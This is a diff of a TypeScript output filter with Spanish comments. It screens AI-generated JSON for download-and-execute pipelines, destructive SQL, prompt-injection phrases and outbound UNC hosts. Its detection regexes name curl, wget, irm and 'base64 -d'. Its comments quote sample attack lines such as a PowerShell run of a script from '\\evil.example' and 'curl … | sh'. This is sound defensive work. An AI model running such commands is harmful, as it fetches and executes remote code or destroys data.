@@ -119,14 +119,12 @@ export async function llamarIA<T>(env: CloudflareBindings, p: { org_id: string; 
     msg = await enviar(ai, plan, system, messages, p.ruta, p.timeoutMs ?? plan.timeoutMs);
   } catch (e) {
     // En el SDK de TS, APIConnectionError (y su timeout) es subclase de APIError sin `status`: cuenta como transitorio
-    const es4xx = e instanceof Anthropic.APIError && typeof e.status === 'number' && e.status < 500;
+    const status = e instanceof Anthropic.APIError && typeof e.status === 'number' ? e.status : null;
+    const es4xx = status !== null && status < 500;                             // un 4xx no se cobra: costo 0
     await liquidarIA(env, reserva, { cost: es4xx ? 0 : null, stop: es4xx ? 'error_4xx' : 'error_transient' });
-    log('warn', 'ia.error', { ruta: p.ruta, model: plan.model, usage_id: reserva,
-      status: e instanceof Anthropic.APIError ? (e.status ?? null) : null, tipo: e instanceof Error ? e.name : 'desconocido' });
-    if (e instanceof Anthropic.RateLimitError) return { ok: false, code: 'budget' };          // incluye enforced_spend_limit_reached
-    if (e instanceof Anthropic.BadRequestError)                                              // límite de gasto del workspace = 400
-      return { ok: false, code: /usage limits/i.test(e.message) ? 'budget' : 'invalid' };
-    return { ok: false, code: 'timeout' };                                                   // timeout, conexión, 5xx, 529
+    log('warn', 'ia.error', { ruta: p.ruta, model: plan.model, usage_id: reserva, status,
+      error_type: e instanceof Anthropic.APIError ? e.type : null, tipo: e instanceof Error ? e.name : 'desconocido' });
+    return { ok: false, code: falloProveedor(e, status) };                     // devuelve, nunca lanza hacia la cola
   }
 
   // 4) Liquidar con el usage real (con fallback suma usage.iterations). La fila conserva plan.model (check de la sección 5)
@@ -148,12 +146,203 @@ export async function llamarIA<T>(env: CloudflareBindings, p: { org_id: string; 
   try { json = JSON.parse(texto); } catch { return { ok: false, code: 'invalid' }; }
   const v = p.esquema.safeParse(json);
   if (!v.success) return { ok: false, code: 'invalid' };
-  const reasons = checkSalidaIA(texto, p.extraHosts ?? []);
+  // Sobre lo YA parseado: en el texto crudo un escape \uXXXX (\u007c = |) esquiva todas las banderas, y en
+  // JSON.stringify cada \ sale doble y checkFixPrompt, que la lee como /, ve «//» (URL relativa al protocolo) en salidas
+  // limpias como grep '\.env' o %APPDATA%\x.json. Se mira cada string tal cual y cada línea lógica que une varias líneas
+  // o campos (lineasLogicas); vale la bandera de cualquiera. Con saltos de línea, otra pasada con ¶ delante de cada
+  // salto solo para «borrado»: la negación («Nunca⏎Ejecuta drop table») no cruza de una línea a otra. Salto es todo
+  // separador de SALTO: CR, VT, FF, NEL, LS y PS los cortaba antes, sin decirlo, el escape de JSON.stringify (\r,
+  // \u000b, \f…), y un textarea o un terminal los pintan como salto. Las demás banderas no se toman de esa pasada (¶
+  // pegado a un host lo vuelve inválido). Las rachas de \ pasan por barras(): «\\evil.example» (UNC o //host), también
+  // entre comillas, sigue siendo un host de salida, pero no «.\\config.json» ni «[\\w.-]» de una regex. ignora_instrucciones y
+  // etiqueta_rol se miran además sobre todos los campos unidos con los saltos como blancos (su .{0,40} no cruza un salto
+  // y antes lo cruzaba el JSON aplanado); solo esas dos, para no unir borrados ni URLs de campos distintos.
+  const hosts = p.extraHosts ?? [];
+  const xs = cadenas(v.data);
+  const reasons = unicos([
+    ...lineasLogicas(xs).map(barras).flatMap((t) => [
+      ...checkSalidaIA(t, hosts),
+      ...(SALTO.test(t) ? checkSalidaIA(t.replace(SALTOS, '¶$&'), hosts).filter((f) => f === 'borrado') : [])]),
+    ...checkSalidaIA(xs.join(' ').replace(SALTOS, ' '), hosts).filter((f) => f === 'ignora_instrucciones' || f === 'etiqueta_rol')]);
   if (reasons.length > 0) {
     log('warn', 'ia.salida_filtrada', { ruta: p.ruta, usage_id: reserva, reasons });     // banderas nuestras, no la salida
     return { ok: false, code: 'invalid', reasons };
   }
   return { ok: true, data: v.data, model: msg.model, cost_usd: costo };
+}
+
+/** Todos los strings de la salida validada, en orden (las claves las fija el esquema: zod descarta las demás). */
+function cadenas(x: unknown): string[] {
+  if (typeof x === 'string') return [x];
+  return x !== null && typeof x === 'object' ? Object.values(x).flatMap(cadenas) : [];
+}
+
+// Separadores de línea: LF y CRLF (los de bash) y CR, VT, FF, NEL, LS y PS, que un textarea o un terminal también
+// pintan como salto. INVISIBLES es la clase que core quita en su variante «limpia».
+const SALTO = /\r\n|[\n\r\v\f\u0085\u2028\u2029]/;
+const SALTOS = new RegExp(SALTO.source, 'g');
+const INVISIBLES = /[\p{Cf}\p{Default_Ignorable_Code_Point}]/gu;
+const RACHA = /(?<!\\)\\{2,}/g;                            // racha de 2 o más \; lineal: solo casa al inicio de la racha
+const NO_ABRE = '.%~$)]}';                                 // tras ellos nunca empieza una autoridad (.\\x, %APPDATA%\\x, (x86)\\x)
+const FIN_HOST = /[\s/\\]/;                                // donde acaba el servidor de una ruta UNC
+// Host de fuera: una etiqueta y un punto seguido de dos letras (todo dominio de primer nivel empieza así, también xn--)
+// o una IPv4 (1.2.3.4, 127.1 y 0x7f.1 también las aceptan Windows y el navegador); «\\d.5» o «(\\d.x)» de una regex en un
+// literal no. El 。 y el %XX hoy no cambian nada (core no los lee como punto): están para que barras() no los esconda si
+// core empieza a leerlos. Un fichero con extensión que no es dominio de primer nivel no resuelve, ni un *.localhost.
+const PUNTO_HOST = /[\p{L}\p{N}\p{M}][.。][\p{L}\p{M}]{2}|^(?:0x[\da-f]*|\d+)(?:\.(?:0x[\da-f]*|\d+))+|%[0-9a-f]{2}/iu;
+// FICHERO: extensión que no es dominio de primer nivel, nunca resuelve. SUELTO: extensión que sí lo es o podría serlo
+// (.md, .py, .sh, .zip…): fichero solo si va suelto, sin recurso compartido detrás, dentro de un literal entre comillas
+// («"\\README.md"», «"python \\manage.py"»; «net view \\evil.sh» no) y fuera de un src=/href= o un enlace Markdown, donde
+// el navegador sí carga \\x.sh como //x.sh.
+const FICHERO = /^[\w-]+(?:\.[\w-]+)*\.(?:jsonc?|[mc]?js|jsx|tsx?|ps[dm]?1|bat|cmd|exe|dll|ini|cfg|conf|config|ya?ml|toml|env|txt|csv|xml|html?|s?css|sql|sqlite3?|db|lock|lockb|csproj|sln|vbs?|class|jar|php|pem|crt|cer|pfx|bak|tmp|png|jpe?g|gif|svg|ico|webp|bmp|pdf|docx?|xlsx?|vue|svelte|go|rb|dart|java|kts?|swift|cs|[ch]pp|lua|tfvars|gradle|gitignore|dockerignore|npmrc|nvmrc|editorconfig|log|wasm|woff2?|ttf|otf|eot|mp[34]|wav|t?gz|tar|jsonl|proto|graphql|gql|prisma|plist|bash|zsh|ipynb|pyc|rst|tsv|patch|diff|sass|mdx)$/i;
+const SUELTO = /^[\w-]+(?:\.[\w-]+)*\.(?:md|py|sh|rs|so|pl|pm|mk|mo|ml|cc|tf|ps|ai|gd|cr|in|am|zip|mov|app|key|map|less|scala|astro|properties|sum|mod|hcl|exs?|erl|elm|hs|nix|zig|sol|ejs|hbs|pug|twig|jsp|aspx?|cshtml|razor|xaml|resx)$/i;
+const ENLACE = /(?:\b(?:src|href|action|formaction|data|poster|background|cite|srcset)[ \t]*=[ \t]*["']?|\]\(|<)$/i;
+const NOMBRE = /^[\w.-]+$/, LOCAL = /\.localhost$/i;      // \\wsl.localhost\Ubuntu: nunca sale de la máquina
+const CIERRE = new Set('`\'")]};,.:');                     // puntuación de código o de prosa tras el nombre
+const LIMPIO = /[\w.-]/, LETRA = /\p{L}/u;                 // carácter de un nombre de fichero; letra
+const MAS_HOST = /[.。][\p{L}\p{M}]{2}|[@%]/u;             // tras el nombre sigue un host: «x.json".evil.example», «"@evil»
+// Comentario de bash tras |, |&, $(, <( o un ` que no se cierra en la línea («cmd | # instala», «cmd |#c», «sh -c "$(#c»):
+// el # empieza palabra, se come el resto de la línea y lo de antes sigue abierto en la de abajo. Lineal: cada intento
+// se para en el primer carácter que no es blanco tras el que abre.
+const COMENTARIO = /(\|&?|\$\(|<\()[ \t]*#.*$|(`)[ \t]*#[^`]*$/;
+const ABRE = /(?:\|&?|\$\(|<\(|`)$/;                       // lo que deja abierta la línea si acaba en ello
+const conBarras = (t: string) => t.length >= 3 && t.startsWith('|') && t.endsWith('|');  // «| … |»
+const dosCeldas = (t: string) => t.indexOf('|', 1) < t.length - 1;                       // «| a | b |», no «| sh |»
+const separadora = (t: string) => conBarras(t) && t.includes('-') && /^[|:\- \t]+$/.test(t);   // «|---|», «| :-- |»
+const impar = (t: string) => t.replace(/`{3,}/g, '').split('`').length % 2 === 0;        // n.º impar de ` (``` es valla)
+// Comando de descarga con argumento (opción, comilla, variable, URL, host o ruta; en PowerShell también «irm (…)»,
+// «irm [uri]…», «irm @p» y la continuación «irm `»), no la mención en prosa («usa curl para», «tienes curl instalado.»,
+// «Instala con `curl`»). Lineal: cada intento solo recorre los blancos y la palabra que siguen.
+const DESCARGA = /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)(?:\.exe)?(?:[ \t]*[([{@]|[ \t]+(?:[-"'$\x60]|[\w.-]*(?:[:/]|\.[\w-])))|\bbase64[ \t]+(?:-d|--decode)\b/i;
+
+/** Con \ = / (lo que hace checkFixPrompt), una racha de \\ es «//», URL relativa al protocolo. Ante un host de fuera
+ *  (hostExterno) queda en exactamente \\, también tras una comilla: PowerShell y cmd no escapan la \ («& "\\evil.example\
+ *  s\x.ps1"», @"\\host\x" de C#) y «"\\\\host\\x"» de un literal sigue siendo \\host. Se reduce a una \ donde no abre
+ *  un host: tras . % ~ $ ) ] } (.\\config.json, %APPDATA%\\app.json, ${dir}\\x.json) o si lo que sigue no es un host de
+ *  fuera («[\\w.-]+» o «(\\d.\\d)» de una regex en un literal, «"\\config.json"», «"\\.env"», src\\**\\*.json). */
+function barras(t: string): string {
+  return t.replace(RACHA, (m: string, i: number) => {
+    const antes = t.charAt(i - 1);
+    return (antes === '' || !NO_ABRE.includes(antes)) && hostExterno(t, i, m.length) ? '\\\\' : '\\';
+  });
+}
+
+/** El tramo de t tras la racha de `largo` \ que empieza en `i`, hasta el blanco, / o \ (el servidor de una ruta UNC), en
+ *  NFKC y sin invisibles (lo que mira core), es un host de fuera: PUNTO_HOST y no un fichero ni *.localhost. Sin recortar
+ *  en ? # @ " ): Windows y el navegador no cortan ahí igual, y «\\w.)x.evil.example» sigue contando. Es fichero si su
+ *  nombre limpio es FICHERO, o SUELTO (ver arriba), y tras él solo viene cierre de código sin más host («"\\run.js",
+ *  "cwd"», «["python","\\manage.py"]»; «x.json".evil.example» no). Con \\ y la siguiente separación también doble, dentro
+ *  de un literal y fuera de un src=/href=, son \ escapadas («"\\MyApp.Web\\appsettings.json"» es \MyApp.Web\…); el
+ *  «& "\\host\\s\\x.ps1"» de PowerShell, que Windows colapsa, ya pasaba en HEAD. Lineal: los tramos de dos rachas no se
+ *  pisan (cada uno acaba en la \ con la que empieza la siguiente) y ENLACE y enLiteral miran como mucho los 80
+ *  caracteres anteriores. */
+function hostExterno(t: string, i: number, largo: number): boolean {
+  let fin = i + largo;
+  while (fin < t.length && !FIN_HOST.test(t.charAt(fin))) fin++;
+  const h = t.slice(i + largo, fin).normalize('NFKC').replace(INVISIBLES, '');
+  if (!PUNTO_HOST.test(h)) return false;
+  let e = h.length;
+  while (e > 0 && CIERRE.has(h.charAt(e - 1))) e--;                      // a mano: «[…]+$» retrocede en cuadrático
+  const n = h.slice(0, e);
+  if (NOMBRE.test(n) && LOCAL.test(n)) return false;
+  let k = 0;
+  while (k < n.length && LIMPIO.test(n.charAt(k))) k++;
+  const nombre = n.slice(0, k), resto = n.slice(k);
+  if (resto && (!CIERRE.has(resto.charAt(0)) || MAS_HOST.test(resto))) return true;
+  if (FICHERO.test(nombre)) return false;
+  const sep = t.charAt(fin), doble = largo === 2 && t.startsWith('\\\\', fin);
+  if (!doble && (!SUELTO.test(nombre) || sep === '\\' || sep === '/')) return true;
+  const antes = t.slice(Math.max(0, i - 80), i).split(SALTOS).pop() ?? '';
+  return ENLACE.test(antes) || !enLiteral(antes);
+}
+
+/** Lo que precede en la línea deja abierta una comilla (", ' o `): la \\ va dentro de un literal («"\\README.md"»,
+ *  «os.system("python \\manage.py")»), no en un comando o en prosa («net view \\evil.sh»). El apóstrofo entre dos
+ *  letras no cuenta («Don't run net view \\evil.sh»). */
+function enLiteral(antes: string): boolean {
+  let d = 0, s = 0, g = 0;
+  for (let k = 0; k < antes.length; k++) {
+    const c = antes.charAt(k);
+    if (c === '"') d++;
+    else if (c === '`') g++;
+    else if (c === "'" && !(LETRA.test(antes.charAt(k - 1)) && LETRA.test(antes.charAt(k + 1)))) s++;
+  }
+  return d % 2 === 1 || s % 2 === 1 || g % 2 === 1;
+}
+
+/** Cada string tal cual y además cada línea lógica que une varias líneas, de un campo o de campos seguidos (se pintan en
+ *  líneas seguidas). Como en bash, una línea sigue en la de abajo si acaba en \ (se quita y se pega sin espacio: «s\⏎h»
+ *  es sh), en | o |& (también con el ` de PowerShell detrás, y saltando líneas vacías y comentarios) o con $(, <( o un `
+ *  abierto, aunque detrás vaya un comentario (COMENTARIO: «|#c», «$( # c») o una \⏎ antes de él o de una línea vacía
+ *  («|\⏎#c», «|\⏎⏎»); y una línea que empieza por | es la cola de la anterior. Una fila de tabla Markdown no es
+ *  cola ni tubería salvo que la traiga una continuación de verdad: «| Usa curl |» + «Node 20» no se unen. Es fila la
+ *  del bloque «| … |» con separadora («|---|»), salvo su primera fila si es de una celda y la línea lógica lleva un comando
+ *  de descarga (DESCARGA: «curl …⏎| sh |⏎|---|»); sin separadora, solo «| a | b |» y solo sin comando de descarga:
+ *  «curl -s https://…» + «| sh |» o + «| tee a | sh |» sí se unen. Se decide sobre NFKC sin invisibles, lo que mira
+ *  core (｜ = |). Si no, no se unen: «…hace un drop» + «Table pedidos…» no es un
+ *  borrado ni la negación del final de una línea tapa el comando de la siguiente. Lineal: cada línea entra a lo sumo en
+ *  una unión y DESCARGA mira la línea más los 30 últimos caracteres de lo ya unido («cu\⏎rl …»). */
+function lineasLogicas(xs: string[]): string[] {
+  const ls = xs.flatMap((s) => s.normalize('NFKC').replace(INVISIBLES, '').split(SALTOS)).map((l) => l.trimEnd());
+  const ts = ls.map((l) => l.trimStart());
+  const tabla: boolean[] = [], cabecera: boolean[] = [];                  // bloque «| … |» con separadora y su 1.ª fila
+  for (let i = 0, j = 0; i < ts.length; i = Math.max(j, i + 1)) {
+    let sep = false;
+    for (j = i; j < ts.length && conBarras(ts[j]!); j++) sep ||= separadora(ts[j]!);
+    for (let k = i; k < j; k++) tabla[k] = sep;
+    cabecera[i] = sep;
+  }
+  const fila = (k: number, descarga: boolean) => {
+    const t = ts[k] ?? '';
+    if (tabla[k] === true) return !descarga || cabecera[k] !== true || dosCeldas(t);
+    return !descarga && conBarras(t) && dosCeldas(t);
+  };
+  const out = [...xs];
+  // ult: lo que deja abierto lo ya unido (ABRE); fin: sus 30 últimos caracteres, aparte (un slice de la línea que crece
+  // la copia entera en cada vuelta: cuadrático)
+  let linea = '', fin = '', piezas = 0, descarga = false, ult = '';
+  let prev: '' | 'barra' | 'tubo' | 'abre' | 'cola' = '';                  // cómo sigue la línea anterior ('' = no sigue)
+  const cierra = () => { if (piezas > 1) out.push(linea); linea = fin = ult = ''; piezas = 0; descarga = false; };
+  for (let i = 0; i < ls.length; i++) {
+    const t = ts[i]!, real: boolean = prev === 'barra' || prev === 'tubo' || prev === 'abre';
+    if ((prev === 'tubo' || prev === 'abre') && (t === '' || t.startsWith('#'))) continue;   // bash se las salta
+    // Se decide sobre d: tras una \⏎, que bash quita, la línea sigue a lo ya unido, así que «cmd |\⏎#c⏎sh» y
+    // «cmd |\⏎⏎sh» siguen la tubería (d = «|#c» y «|»); la pieza que se pega es lo de d que es de esta línea
+    const k: number = prev === 'barra' ? ult.length : 0;
+    let d: string = (k ? ult : '') + ls[i]!;
+    d = d.replace(COMENTARIO, '$1$2');
+    if (d.endsWith('`')) {                                                   // PowerShell: «|`⏎» sigue la tubería
+      const sinBt = d.slice(0, -1).trimEnd();
+      if (sinBt.endsWith('|') || sinBt.endsWith('|&')) d = sinBt;
+    }
+    const c = d.slice(k), sig = ts[i + 1] ?? '', pega = prev === 'barra' ? '' : ' ';
+    descarga ||= DESCARGA.test(fin + (piezas ? pega : '') + c);
+    prev = d.endsWith('\\') ? 'barra'
+      : (d.endsWith('|') || d.endsWith('|&')) && (real || !fila(i, descarga)) ? 'tubo'
+      : d.endsWith('$(') || d.endsWith('<(') || (d.endsWith('`') && impar(d)) ? 'abre'
+      : sig.startsWith('|') && !fila(i + 1, descarga) ? 'cola' : '';
+    const pieza = (piezas++ ? pega : '') + (prev === 'barra' ? c.slice(0, -1) : c);
+    linea += pieza;
+    fin = (fin + pieza).slice(-30);
+    if (pieza.trim()) ult = ABRE.exec(pieza.trimEnd())?.[0] ?? '';
+    if (!prev) cierra();
+  }
+  cierra();
+  return out;
+}
+
+// Fallo del proveedor → code. Gasto o saldo de la key (400 o 403 «credit balance is too low», «usage limits» o
+// «billing», 402 billing_error, 429 rate_limit_error o enforced_spend_limit_reached) → budget; otro 401/403 (key
+// revocada, sin permiso o bloqueada) → disabled; otro 4xx (400, 404, 413…) → invalid; timeout, conexión, 5xx y 529 →
+// timeout. Con cualquiera el llamador pone la plantilla (fix_prompt: fallback_prompt o model 'template'; resumen_ia:
+// plantillaResumen) y el paso acaba en done.
+const SIN_SALDO = /credit balance|usage limit|spend(?:ing)? limit|billing/i;
+function falloProveedor(e: unknown, status: number | null): Fallo {
+  const tipo = e instanceof Anthropic.APIError ? e.type : null;
+  if (status === 402 || status === 429 || tipo === 'billing_error' || tipo === 'rate_limit_error') return 'budget';
+  if ((status === 400 || status === 403) && e instanceof Error && SIN_SALDO.test(e.message)) return 'budget';
+  if (status === 401 || status === 403) return 'disabled';
+  return status !== null && status < 500 ? 'invalid' : 'timeout';
 }
 
 async function enviar(ai: Anthropic, plan: Plan, system: Anthropic.TextBlockParam[], messages: Anthropic.MessageParam[],
